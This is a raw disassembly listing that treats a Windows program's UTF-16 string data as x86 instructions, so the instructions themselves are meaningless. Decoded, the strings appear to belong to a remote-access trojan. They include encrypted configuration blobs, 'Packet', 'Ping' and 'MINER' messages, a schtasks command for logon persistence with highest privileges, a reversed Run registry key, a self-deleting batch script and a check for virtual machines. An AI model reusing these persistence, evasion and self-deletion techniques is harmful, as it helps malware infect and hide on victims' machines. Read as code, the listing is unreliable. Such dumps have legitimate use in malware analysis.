  40b990:	00 79 00             	add    %bh,0x0(%ecx)
  40b993:	4c                   	dec    %esp
  40b994:	00 48 00             	add    %cl,0x0(%eax)
  40b997:	41                   	inc    %ecx
  40b998:	00 56 00             	add    %dl,0x0(%esi)
  40b99b:	53                   	push   %ebx
  40b99c:	00 76 00             	add    %dh,0x0(%esi)
  40b99f:	49                   	dec    %ecx
  40b9a0:	00 2b                	add    %ch,(%ebx)
  40b9a2:	00 5a 00             	add    %bl,0x0(%edx)
  40b9a5:	2b 00                	sub    (%eax),%eax
  40b9a7:	4b                   	dec    %ebx
  40b9a8:	00 2f                	add    %ch,(%edi)
  40b9aa:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b9ae:	00 6f 00             	add    %ch,0x0(%edi)
  40b9b1:	41                   	inc    %ecx
  40b9b2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b9b5:	70 00                	jo     0x40b9b7
  40b9b7:	54                   	push   %esp
  40b9b8:	00 72 00             	add    %dh,0x0(%edx)
  40b9bb:	71 00                	jno    0x40b9bd
  40b9bd:	58                   	pop    %eax
  40b9be:	00 50 00             	add    %dl,0x0(%eax)
  40b9c1:	4a                   	dec    %edx
  40b9c2:	00 33                	add    %dh,(%ebx)
  40b9c4:	00 32                	add    %dh,(%edx)
  40b9c6:	00 55 00             	add    %dl,0x0(%ebp)
  40b9c9:	30 00                	xor    %al,(%eax)
  40b9cb:	54                   	push   %esp
  40b9cc:	00 62 00             	add    %ah,0x0(%edx)
  40b9cf:	56                   	push   %esi
  40b9d0:	00 36                	add    %dh,(%esi)
  40b9d2:	00 2b                	add    %ch,(%ebx)
  40b9d4:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9d7:	5a                   	pop    %edx
  40b9d8:	00 47 00             	add    %al,0x0(%edi)
  40b9db:	75 00                	jne    0x40b9dd
  40b9dd:	31 00                	xor    %eax,(%eax)
  40b9df:	77 00                	ja     0x40b9e1
  40b9e1:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40b9e5:	63 00                	arpl   %eax,(%eax)
  40b9e7:	54                   	push   %esp
  40b9e8:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40b9ec:	00 67 00             	add    %ah,0x0(%edi)
  40b9ef:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b9f4:	80 b1 45 00 44 00 70 	xorb   $0x70,0x440045(%ecx)
  40b9fb:	00 39                	add    %bh,(%ecx)
  40b9fd:	00 79 00             	add    %bh,0x0(%ecx)
  40ba00:	45                   	inc    %ebp
  40ba01:	00 52 00             	add    %dl,0x0(%edx)
  40ba04:	41                   	inc    %ecx
  40ba05:	00 38                	add    %bh,(%eax)
  40ba07:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40ba0b:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40ba0f:	00 55 00             	add    %dl,0x0(%ebp)
  40ba12:	6c                   	insb   (%dx),%es:(%edi)
  40ba13:	00 72 00             	add    %dh,0x0(%edx)
  40ba16:	58                   	pop    %eax
  40ba17:	00 6a 00             	add    %ch,0x0(%edx)
  40ba1a:	2b 00                	sub    (%eax),%eax
  40ba1c:	33 00                	xor    (%eax),%eax
  40ba1e:	45                   	inc    %ebp
  40ba1f:	00 57 00             	add    %dl,0x0(%edi)
  40ba22:	2b 00                	sub    (%eax),%eax
  40ba24:	6d                   	insl   (%dx),%es:(%edi)
  40ba25:	00 41 00             	add    %al,0x0(%ecx)
  40ba28:	38 00                	cmp    %al,(%eax)
  40ba2a:	68 00 54 00 58       	push   $0x58005400
  40ba2f:	00 32                	add    %dh,(%edx)
  40ba31:	00 6f 00             	add    %ch,0x0(%edi)
  40ba34:	66 00 39             	data16 add %bh,(%ecx)
  40ba37:	00 59 00             	add    %bl,0x0(%ecx)
  40ba3a:	31 00                	xor    %eax,(%eax)
  40ba3c:	41                   	inc    %ecx
  40ba3d:	00 41 00             	add    %al,0x0(%ecx)
  40ba40:	48                   	dec    %eax
  40ba41:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba44:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40ba48:	7a 00                	jp     0x40ba4a
  40ba4a:	49                   	dec    %ecx
  40ba4b:	00 73 00             	add    %dh,0x0(%ebx)
  40ba4e:	4a                   	dec    %edx
  40ba4f:	00 7a 00             	add    %bh,0x0(%edx)
  40ba52:	64 00 2b             	add    %ch,%fs:(%ebx)
  40ba55:	00 58 00             	add    %bl,0x0(%eax)
  40ba58:	33 00                	xor    (%eax),%eax
  40ba5a:	6d                   	insl   (%dx),%es:(%edi)
  40ba5b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba5e:	71 00                	jno    0x40ba60
  40ba60:	2b 00                	sub    (%eax),%eax
  40ba62:	59                   	pop    %ecx
  40ba63:	00 59 00             	add    %bl,0x0(%ecx)
  40ba66:	34 00                	xor    $0x0,%al
  40ba68:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40ba6c:	76 00                	jbe    0x40ba6e
  40ba6e:	79 00                	jns    0x40ba70
  40ba70:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40ba74:	4b                   	dec    %ebx
  40ba75:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba78:	73 00                	jae    0x40ba7a
  40ba7a:	45                   	inc    %ebp
  40ba7b:	00 45 00             	add    %al,0x0(%ebp)
  40ba7e:	43                   	inc    %ebx
  40ba7f:	00 41 00             	add    %al,0x0(%ecx)
  40ba82:	65 00 35 00 47 00 41 	add    %dh,%gs:0x41004700
  40ba89:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40ba8d:	00 63 00             	add    %ah,0x0(%ebx)
  40ba90:	57                   	push   %edi
  40ba91:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40ba95:	00 31                	add    %dh,(%ecx)
  40ba97:	00 6f 00             	add    %ch,0x0(%edi)
  40ba9a:	2b 00                	sub    (%eax),%eax
  40ba9c:	33 00                	xor    (%eax),%eax
  40ba9e:	71 00                	jno    0x40baa0
  40baa0:	67 00 3d             	add    %bh,(%di)
  40baa3:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40baa9:	75 00                	jne    0x40baab
  40baab:	54                   	push   %esp
  40baac:	00 4e 00             	add    %cl,0x0(%esi)
  40baaf:	41                   	inc    %ecx
  40bab0:	00 36                	add    %dh,(%esi)
  40bab2:	00 66 00             	add    %ah,0x0(%esi)
  40bab5:	2b 00                	sub    (%eax),%eax
  40bab7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bab8:	00 45 00             	add    %al,0x0(%ebp)
  40babb:	77 00                	ja     0x40babd
  40babd:	78 00                	js     0x40babf
  40babf:	30 00                	xor    %al,(%eax)
  40bac1:	70 00                	jo     0x40bac3
  40bac3:	32 00                	xor    (%eax),%al
  40bac5:	43                   	inc    %ebx
  40bac6:	00 47 00             	add    %al,0x0(%edi)
  40bac9:	30 00                	xor    %al,(%eax)
  40bacb:	51                   	push   %ecx
  40bacc:	00 7a 00             	add    %bh,0x0(%edx)
  40bacf:	45                   	inc    %ebp
  40bad0:	00 36                	add    %dh,(%esi)
  40bad2:	00 30                	add    %dh,(%eax)
  40bad4:	00 41 00             	add    %al,0x0(%ecx)
  40bad7:	36 00 37             	add    %dh,%ss:(%edi)
  40bada:	00 55 00             	add    %dl,0x0(%ebp)
  40badd:	72 00                	jb     0x40badf
  40badf:	35 00 6a 00 39       	xor    $0x39006a00,%eax
  40bae4:	00 7a 00             	add    %bh,0x0(%edx)
  40bae7:	62 00                	bound  %eax,(%eax)
  40bae9:	31 00                	xor    %eax,(%eax)
  40baeb:	32 00                	xor    (%eax),%al
  40baed:	78 00                	js     0x40baef
  40baef:	5a                   	pop    %edx
  40baf0:	00 2b                	add    %ch,(%ebx)
  40baf2:	00 4f 00             	add    %cl,0x0(%edi)
  40baf5:	43                   	inc    %ebx
  40baf6:	00 30                	add    %dh,(%eax)
  40baf8:	00 39                	add    %bh,(%ecx)
  40bafa:	00 50 00             	add    %dl,0x0(%eax)
  40bafd:	51                   	push   %ecx
  40bafe:	00 38                	add    %bh,(%eax)
  40bb00:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40bb04:	00 63 00             	add    %ah,0x0(%ebx)
  40bb07:	39 00                	cmp    %eax,(%eax)
  40bb09:	76 00                	jbe    0x40bb0b
  40bb0b:	53                   	push   %ebx
  40bb0c:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40bb10:	00 56 00             	add    %dl,0x0(%esi)
  40bb13:	48                   	dec    %eax
  40bb14:	00 48 00             	add    %cl,0x0(%eax)
  40bb17:	6c                   	insb   (%dx),%es:(%edi)
  40bb18:	00 38                	add    %bh,(%eax)
  40bb1a:	00 69 00             	add    %ch,0x0(%ecx)
  40bb1d:	33 00                	xor    (%eax),%eax
  40bb1f:	57                   	push   %edi
  40bb20:	00 53 00             	add    %dl,0x0(%ebx)
  40bb23:	49                   	dec    %ecx
  40bb24:	00 4e 00             	add    %cl,0x0(%esi)
  40bb27:	44                   	inc    %esp
  40bb28:	00 79 00             	add    %bh,0x0(%ecx)
  40bb2b:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40bb2f:	33 00                	xor    (%eax),%eax
  40bb31:	75 00                	jne    0x40bb33
  40bb33:	61                   	popa
  40bb34:	00 45 00             	add    %al,0x0(%ebp)
  40bb37:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40bb3b:	2f                   	das
  40bb3c:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40bb40:	00 4a 00             	add    %cl,0x0(%edx)
  40bb43:	78 00                	js     0x40bb45
  40bb45:	46                   	inc    %esi
  40bb46:	00 72 00             	add    %dh,0x0(%edx)
  40bb49:	56                   	push   %esi
  40bb4a:	00 53 00             	add    %dl,0x0(%ebx)
  40bb4d:	70 00                	jo     0x40bb4f
  40bb4f:	69 00 52 00 41 00    	imul   $0x410052,(%eax),%eax
  40bb55:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bb5a:	80 b1 30 00 55 00 46 	xorb   $0x46,0x550030(%ecx)
  40bb61:	00 58 00             	add    %bl,0x0(%eax)
  40bb64:	63 00                	arpl   %eax,(%eax)
  40bb66:	67 00 47 00          	add    %al,0x0(%bx)
  40bb6a:	4e                   	dec    %esi
  40bb6b:	00 4f 00             	add    %cl,0x0(%edi)
  40bb6e:	55                   	push   %ebp
  40bb6f:	00 32                	add    %dh,(%edx)
  40bb71:	00 31                	add    %dh,(%ecx)
  40bb73:	00 52 00             	add    %dl,0x0(%edx)
  40bb76:	54                   	push   %esp
  40bb77:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb7a:	74 00                	je     0x40bb7c
  40bb7c:	44                   	inc    %esp
  40bb7d:	00 36                	add    %dh,(%esi)
  40bb7f:	00 30                	add    %dh,(%eax)
  40bb81:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40bb85:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb88:	39 00                	cmp    %eax,(%eax)
  40bb8a:	44                   	inc    %esp
  40bb8b:	00 2b                	add    %ch,(%ebx)
  40bb8d:	00 68 00             	add    %ch,0x0(%eax)
  40bb90:	6c                   	insb   (%dx),%es:(%edi)
  40bb91:	00 68 00             	add    %ch,0x0(%eax)
  40bb94:	37                   	aaa
  40bb95:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40bb99:	00 47 00             	add    %al,0x0(%edi)
  40bb9c:	71 00                	jno    0x40bb9e
  40bb9e:	61                   	popa
  40bb9f:	00 5a 00             	add    %bl,0x0(%edx)
  40bba2:	32 00                	xor    (%eax),%al
  40bba4:	36 00 39             	add    %bh,%ss:(%ecx)
  40bba7:	00 7a 00             	add    %bh,0x0(%edx)
  40bbaa:	31 00                	xor    %eax,(%eax)
  40bbac:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40bbb0:	2f                   	das
  40bbb1:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40bbb5:	00 38                	add    %bh,(%eax)
  40bbb7:	00 69 00             	add    %ch,0x0(%ecx)
  40bbba:	58                   	pop    %eax
  40bbbb:	00 2b                	add    %ch,(%ebx)
  40bbbd:	00 39                	add    %bh,(%ecx)
  40bbbf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbc2:	4e                   	dec    %esi
  40bbc3:	00 30                	add    %dh,(%eax)
  40bbc5:	00 73 00             	add    %dh,0x0(%ebx)
  40bbc8:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbc9:	00 4d 00             	add    %cl,0x0(%ebp)
  40bbcc:	2b 00                	sub    (%eax),%eax
  40bbce:	77 00                	ja     0x40bbd0
  40bbd0:	72 00                	jb     0x40bbd2
  40bbd2:	55                   	push   %ebp
  40bbd3:	00 45 00             	add    %al,0x0(%ebp)
  40bbd6:	6d                   	insl   (%dx),%es:(%edi)
  40bbd7:	00 63 00             	add    %ah,0x0(%ebx)
  40bbda:	51                   	push   %ecx
  40bbdb:	00 41 00             	add    %al,0x0(%ecx)
  40bbde:	79 00                	jns    0x40bbe0
  40bbe0:	72 00                	jb     0x40bbe2
  40bbe2:	35 00 68 00 41       	xor    $0x41006800,%eax
  40bbe7:	00 51 00             	add    %dl,0x0(%ecx)
  40bbea:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbeb:	00 5a 00             	add    %bl,0x0(%edx)
  40bbee:	34 00                	xor    $0x0,%al
  40bbf0:	50                   	push   %eax
  40bbf1:	00 76 00             	add    %dh,0x0(%esi)
  40bbf4:	49                   	dec    %ecx
  40bbf5:	00 32                	add    %dh,(%edx)
  40bbf7:	00 6e 00             	add    %ch,0x0(%esi)
  40bbfa:	47                   	inc    %edi
  40bbfb:	00 50 00             	add    %dl,0x0(%eax)
  40bbfe:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbff:	00 2f                	add    %ch,(%edi)
  40bc01:	00 33                	add    %dh,(%ebx)
  40bc03:	00 37                	add    %dh,(%edi)
  40bc05:	00 51 00             	add    %dl,0x0(%ecx)
  40bc08:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bc0d:	01 00                	add    %eax,(%eax)
  40bc0f:	03 33                	add    (%ebx),%esi
  40bc11:	00 00                	add    %al,(%eax)
  40bc13:	09 6e 00             	or     %ebp,0x0(%esi)
  40bc16:	75 00                	jne    0x40bc18
  40bc18:	6c                   	insb   (%dx),%es:(%edi)
  40bc19:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bc1d:	03 3a                	add    (%edx),%edi
  40bc1f:	00 00                	add    %al,(%eax)
  40bc21:	0d 50 00 61 00       	or     $0x610050,%eax
  40bc26:	63 00                	arpl   %eax,(%eax)
  40bc28:	6b 00 65             	imul   $0x65,(%eax),%eax
  40bc2b:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bc2f:	09 50 00             	or     %edx,0x0(%eax)
  40bc32:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bc38:	00 0f                	add    %cl,(%edi)
  40bc3a:	4d                   	dec    %ebp
  40bc3b:	00 65 00             	add    %ah,0x0(%ebp)
  40bc3e:	73 00                	jae    0x40bc40
  40bc40:	73 00                	jae    0x40bc42
  40bc42:	61                   	popa
  40bc43:	00 67 00             	add    %ah,0x0(%edi)
  40bc46:	65 00 00             	add    %al,%gs:(%eax)
  40bc49:	0d 4d 00 49 00       	or     $0x49004d,%eax
  40bc4e:	4e                   	dec    %esi
  40bc4f:	00 45 00             	add    %al,0x0(%ebp)
  40bc52:	52                   	push   %edx
  40bc53:	00 20                	add    %ah,(%eax)
  40bc55:	00 00                	add    %al,(%eax)
  40bc57:	03 30                	add    (%eax),%esi
  40bc59:	00 00                	add    %al,(%eax)
  40bc5b:	0f 7b                	(bad)
  40bc5d:	00 30                	add    %dh,(%eax)
  40bc5f:	00 3a                	add    %bh,(%edx)
  40bc61:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40bc65:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc68:	20 00                	and    %al,(%eax)
  40bc6a:	00 0f                	add    %cl,(%edi)
  40bc6c:	7b 00                	jnp    0x40bc6e
  40bc6e:	30 00                	xor    %al,(%eax)
  40bc70:	3a 00                	cmp    (%eax),%al
  40bc72:	58                   	pop    %eax
  40bc73:	00 32                	add    %dh,(%edx)
  40bc75:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc78:	20 00                	and    %al,(%eax)
  40bc7a:	00 2b                	add    %ch,(%ebx)
  40bc7c:	28 00                	sub    %al,(%eax)
  40bc7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc7f:	00 65 00             	add    %ah,0x0(%ebp)
  40bc82:	76 00                	jbe    0x40bc84
  40bc84:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc88:	20 00                	and    %al,(%eax)
  40bc8a:	75 00                	jne    0x40bc8c
  40bc8c:	73 00                	jae    0x40bc8e
  40bc8e:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bc93:	00 20                	add    %ah,(%eax)
  40bc95:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bc99:	00 70 00             	add    %dh,0x0(%eax)
  40bc9c:	65 00 20             	add    %ah,%gs:(%eax)
  40bc9f:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bca2:	63 00                	arpl   %eax,(%eax)
  40bca4:	31 00                	xor    %eax,(%eax)
  40bca6:	00 45 28             	add    %al,0x28(%ebp)
  40bca9:	00 65 00             	add    %ah,0x0(%ebp)
  40bcac:	78 00                	js     0x40bcae
  40bcae:	74 00                	je     0x40bcb0
  40bcb0:	38 00                	cmp    %al,(%eax)
  40bcb2:	2c 00                	sub    $0x0,%al
  40bcb4:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bcb8:	74 00                	je     0x40bcba
  40bcba:	31 00                	xor    %eax,(%eax)
  40bcbc:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bcc0:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bcc4:	33 00                	xor    (%eax),%eax
  40bcc6:	32 00                	xor    (%eax),%al
  40bcc8:	29 00                	sub    %eax,(%eax)
  40bcca:	20 00                	and    %al,(%eax)
  40bccc:	74 00                	je     0x40bcce
  40bcce:	79 00                	jns    0x40bcd0
  40bcd0:	70 00                	jo     0x40bcd2
  40bcd2:	65 00 20             	add    %ah,%gs:(%eax)
  40bcd5:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bcd8:	63 00                	arpl   %eax,(%eax)
  40bcda:	37                   	aaa
  40bcdb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bcde:	24 00                	and    $0x0,%al
  40bce0:	63 00                	arpl   %eax,(%eax)
  40bce2:	38 00                	cmp    %al,(%eax)
  40bce4:	2c 00                	sub    $0x0,%al
  40bce6:	24 00                	and    $0x0,%al
  40bce8:	63 00                	arpl   %eax,(%eax)
  40bcea:	39 00                	cmp    %eax,(%eax)
  40bcec:	00 19                	add    %bl,(%ecx)
  40bcee:	73 00                	jae    0x40bcf0
  40bcf0:	63 00                	arpl   %eax,(%eax)
  40bcf2:	68 00 74 00 61       	push   $0x61007400
  40bcf7:	00 73 00             	add    %dh,0x0(%ebx)
  40bcfa:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bcfd:	00 2e                	add    %ch,(%esi)
  40bcff:	00 65 00             	add    %ah,0x0(%ebp)
  40bd02:	78 00                	js     0x40bd04
  40bd04:	65 00 00             	add    %al,%gs:(%eax)
  40bd07:	53                   	push   %ebx
  40bd08:	2f                   	das
  40bd09:	00 63 00             	add    %ah,0x0(%ebx)
  40bd0c:	72 00                	jb     0x40bd0e
  40bd0e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bd12:	74 00                	je     0x40bd14
  40bd14:	65 00 20             	add    %ah,%gs:(%eax)
  40bd17:	00 2f                	add    %ch,(%edi)
  40bd19:	00 66 00             	add    %ah,0x0(%esi)
  40bd1c:	20 00                	and    %al,(%eax)
  40bd1e:	2f                   	das
  40bd1f:	00 73 00             	add    %dh,0x0(%ebx)
  40bd22:	63 00                	arpl   %eax,(%eax)
  40bd24:	20 00                	and    %al,(%eax)
  40bd26:	4f                   	dec    %edi
  40bd27:	00 4e 00             	add    %cl,0x0(%esi)
  40bd2a:	4c                   	dec    %esp
  40bd2b:	00 4f 00             	add    %cl,0x0(%edi)
  40bd2e:	47                   	inc    %edi
  40bd2f:	00 4f 00             	add    %cl,0x0(%edi)
  40bd32:	4e                   	dec    %esi
  40bd33:	00 20                	add    %ah,(%eax)
  40bd35:	00 2f                	add    %ch,(%edi)
  40bd37:	00 52 00             	add    %dl,0x0(%edx)
  40bd3a:	4c                   	dec    %esp
  40bd3b:	00 20                	add    %ah,(%eax)
  40bd3d:	00 48 00             	add    %cl,0x0(%eax)
  40bd40:	49                   	dec    %ecx
  40bd41:	00 47 00             	add    %al,0x0(%edi)
  40bd44:	48                   	dec    %eax
  40bd45:	00 45 00             	add    %al,0x0(%ebp)
  40bd48:	53                   	push   %ebx
  40bd49:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bd4d:	00 2f                	add    %ch,(%edi)
  40bd4f:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bd53:	00 20                	add    %ah,(%eax)
  40bd55:	00 22                	add    %ah,(%edx)
  40bd57:	00 27                	add    %ah,(%edi)
  40bd59:	00 01                	add    %al,(%ecx)
  40bd5b:	13 22                	adc    (%edx),%esp
  40bd5d:	00 27                	add    %ah,(%edi)
  40bd5f:	00 20                	add    %ah,(%eax)
  40bd61:	00 2f                	add    %ch,(%edi)
  40bd63:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40bd67:	00 20                	add    %ah,(%eax)
  40bd69:	00 22                	add    %ah,(%edx)
  40bd6b:	00 27                	add    %ah,(%edi)
  40bd6d:	00 01                	add    %al,(%ecx)
  40bd6f:	05 22 00 27 00       	add    $0x270022,%eax
  40bd74:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  40bd77:	00 6e 00             	add    %ch,0x0(%esi)
  40bd7a:	75 00                	jne    0x40bd7c
  40bd7c:	52                   	push   %edx
  40bd7d:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40bd81:	00 6f 00             	add    %ch,0x0(%edi)
  40bd84:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40bd8a:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40bd8e:	74 00                	je     0x40bd90
  40bd90:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd91:	00 65 00             	add    %ah,0x0(%ebp)
  40bd94:	72 00                	jb     0x40bd96
  40bd96:	72 00                	jb     0x40bd98
  40bd98:	75 00                	jne    0x40bd9a
  40bd9a:	43                   	inc    %ebx
  40bd9b:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40bd9f:	00 77 00             	add    %dh,0x0(%edi)
  40bda2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bda3:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40bda7:	00 69 00             	add    %ch,0x0(%ecx)
  40bdaa:	57                   	push   %edi
  40bdab:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40bdaf:	00 66 00             	add    %ah,0x0(%esi)
  40bdb2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdb3:	00 73 00             	add    %dh,0x0(%ebx)
  40bdb6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdb7:	00 72 00             	add    %dh,0x0(%edx)
  40bdba:	63 00                	arpl   %eax,(%eax)
  40bdbc:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40bdc2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bdc6:	61                   	popa
  40bdc7:	00 77 00             	add    %dh,0x0(%edi)
  40bdca:	74 00                	je     0x40bdcc
  40bdcc:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bdd0:	53                   	push   %ebx
  40bdd1:	00 00                	add    %al,(%eax)
  40bdd3:	03 22                	add    (%edx),%esp
  40bdd5:	00 00                	add    %al,(%eax)
  40bdd7:	09 2e                	or     %ebp,(%esi)
  40bdd9:	00 62 00             	add    %ah,0x0(%edx)
  40bddc:	61                   	popa
  40bddd:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bde1:	13 40 00             	adc    0x0(%eax),%eax
  40bde4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bde8:	68 00 6f 00 20       	push   $0x20006f00
  40bded:	00 6f 00             	add    %ch,0x0(%edi)
  40bdf0:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40bdf4:	00 1f                	add    %bl,(%edi)
  40bdf6:	74 00                	je     0x40bdf8
  40bdf8:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40bdfe:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdff:	00 75 00             	add    %dh,0x0(%ebp)
  40be02:	74 00                	je     0x40be04
  40be04:	20 00                	and    %al,(%eax)
  40be06:	33 00                	xor    (%eax),%eax
  40be08:	20 00                	and    %al,(%eax)
  40be0a:	3e 00 20             	add    %ah,%ds:(%eax)
  40be0d:	00 4e 00             	add    %cl,0x0(%esi)
  40be10:	55                   	push   %ebp
  40be11:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40be15:	15 53 00 54 00       	adc    $0x540053,%eax
  40be1a:	41                   	inc    %ecx
  40be1b:	00 52 00             	add    %dl,0x0(%edx)
  40be1e:	54                   	push   %esp
  40be1f:	00 20                	add    %ah,(%eax)
  40be21:	00 22                	add    %ah,(%edx)
  40be23:	00 22                	add    %ah,(%edx)
  40be25:	00 20                	add    %ah,(%eax)
  40be27:	00 22                	add    %ah,(%edx)
  40be29:	00 00                	add    %al,(%eax)
  40be2b:	07                   	pop    %es
  40be2c:	43                   	inc    %ebx
  40be2d:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40be31:	00 00                	add    %al,(%eax)
  40be33:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40be37:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40be3b:	00 22                	add    %ah,(%edx)
  40be3d:	00 00                	add    %al,(%eax)
  40be3f:	0f 22 00             	mov    %eax,%cr0
  40be42:	20 00                	and    %al,(%eax)
  40be44:	2f                   	das
  40be45:	00 66 00             	add    %ah,0x0(%esi)
  40be48:	20 00                	and    %al,(%eax)
  40be4a:	2f                   	das
  40be4b:	00 71 00             	add    %dh,0x0(%ecx)
  40be4e:	00 05 78 00 70 00    	add    %al,0x700078
  40be54:	00 45 53             	add    %al,0x53(%ebp)
  40be57:	00 65 00             	add    %ah,0x0(%ebp)
  40be5a:	6c                   	insb   (%dx),%es:(%edi)
  40be5b:	00 65 00             	add    %ah,0x0(%ebp)
  40be5e:	63 00                	arpl   %eax,(%eax)
  40be60:	74 00                	je     0x40be62
  40be62:	20 00                	and    %al,(%eax)
  40be64:	2a 00                	sub    (%eax),%al
  40be66:	20 00                	and    %al,(%eax)
  40be68:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40be6c:	6f                   	outsl  %ds:(%esi),(%dx)
  40be6d:	00 6d 00             	add    %ch,0x0(%ebp)
  40be70:	20 00                	and    %al,(%eax)
  40be72:	57                   	push   %edi
  40be73:	00 69 00             	add    %ch,0x0(%ecx)
  40be76:	6e                   	outsb  %ds:(%esi),(%dx)
  40be77:	00 33                	add    %dh,(%ebx)
  40be79:	00 32                	add    %dh,(%edx)
  40be7b:	00 5f 00             	add    %bl,0x0(%edi)
  40be7e:	43                   	inc    %ebx
  40be7f:	00 6f 00             	add    %ch,0x0(%edi)
  40be82:	6d                   	insl   (%dx),%es:(%edi)
  40be83:	00 70 00             	add    %dh,0x0(%eax)
  40be86:	75 00                	jne    0x40be88
  40be88:	74 00                	je     0x40be8a
  40be8a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be8e:	53                   	push   %ebx
  40be8f:	00 79 00             	add    %bh,0x0(%ecx)
  40be92:	73 00                	jae    0x40be94
  40be94:	74 00                	je     0x40be96
  40be96:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40be9a:	00 19                	add    %bl,(%ecx)
  40be9c:	4d                   	dec    %ebp
  40be9d:	00 61 00             	add    %ah,0x0(%ecx)
  40bea0:	6e                   	outsb  %ds:(%esi),(%dx)
  40bea1:	00 75 00             	add    %dh,0x0(%ebp)
  40bea4:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40bea8:	63 00                	arpl   %eax,(%eax)
  40beaa:	74 00                	je     0x40beac
  40beac:	75 00                	jne    0x40beae
  40beae:	72 00                	jb     0x40beb0
  40beb0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40beb4:	00 2b                	add    %ch,(%ebx)
  40beb6:	6d                   	insl   (%dx),%es:(%edi)
  40beb7:	00 69 00             	add    %ch,0x0(%ecx)
  40beba:	63 00                	arpl   %eax,(%eax)
  40bebc:	72 00                	jb     0x40bebe
  40bebe:	6f                   	outsl  %ds:(%esi),(%dx)
  40bebf:	00 73 00             	add    %dh,0x0(%ebx)
  40bec2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bec3:	00 66 00             	add    %ah,0x0(%esi)
  40bec6:	74 00                	je     0x40bec8
  40bec8:	20 00                	and    %al,(%eax)
  40beca:	63 00                	arpl   %eax,(%eax)
  40becc:	6f                   	outsl  %ds:(%esi),(%dx)
  40becd:	00 72 00             	add    %dh,0x0(%edx)
  40bed0:	70 00                	jo     0x40bed2
  40bed2:	6f                   	outsl  %ds:(%esi),(%dx)
